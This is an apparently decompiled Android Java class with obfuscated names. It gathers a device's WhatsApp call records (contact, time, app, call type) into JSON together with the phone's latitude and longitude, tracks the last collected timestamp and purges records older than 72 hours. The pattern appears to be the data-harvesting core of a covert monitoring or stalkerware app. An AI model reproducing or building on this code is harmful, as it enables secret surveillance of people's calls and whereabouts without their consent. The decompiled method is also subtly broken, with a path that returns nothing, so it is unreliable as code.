package defpackage;

import android.app.Application;
import java.util.Calendar;
import java.util.List;
import java.util.TimeZone;
import org.json.JSONArray;
import org.json.JSONObject;

/* renamed from: gx1  reason: default package */
public class gx1 extends Application {
    public static ix1 a(xt1 xt1, boolean z) {
        Class<bw1> cls = bw1.class;
        JSONArray jSONArray = new JSONArray();
        long j = 0;
        try {
            j = xt1.l("whatsappcall");
            int p = xt1.p("whatsappcall", 50);
            if (!xt1.a("whatsappcall", z)) {
                return new ix1(jSONArray, j);
            }
            xr1<TModel> a = fs1.c(new js1[0]).a(cls);
            ks1<Long> ks1 = aw1.d;
            List<TModel> p2 = a.q(ks1.e(Long.valueOf(j))).s(ks1, true).r(p).p();
            o82.d("query: date > %s", ox1.c(j));
            if (p2.size() > 0) {
                double g = xt1.g();
                double k = xt1.k();
                for (int i = 0; i < p2.size(); i++) {
                    try {
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put("contact", ((bw1) p2.get(i)).e());
                        jSONObject.put("datetime", ox1.c(((bw1) p2.get(i)).f()));
                        jSONObject.put("packagename", ((bw1) p2.get(i)).g());
                        jSONObject.put("app", ((bw1) p2.get(i)).c());
                        jSONObject.put("type", ((bw1) p2.get(i)).h());
                        jSONObject.put("calltype", ((bw1) p2.get(i)).d());
                        jSONObject.put("latitude", g);
                        jSONObject.put("longitude", k);
                        jSONArray.put(jSONObject);
                        if (((bw1) p2.get(i)).f() > j) {
                            j = ((bw1) p2.get(i)).f();
                        }
                    } catch (Exception e) {
                        qg1.a().c(e);
                        e.printStackTrace();
                    }
                }
                try {
                    Calendar instance = Calendar.getInstance();
                    instance.setTimeZone(TimeZone.getTimeZone("UTC"));
                    instance.add(10, -72);
                    fs1.b(cls).q(aw1.d.f(Long.valueOf(instance.getTimeInMillis()))).m().h();
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
            return new ix1(jSONArray, j);
        } catch (Exception e3) {
            qg1.a().c(e3);
            e3.printStackTrace();
        }
    }
}
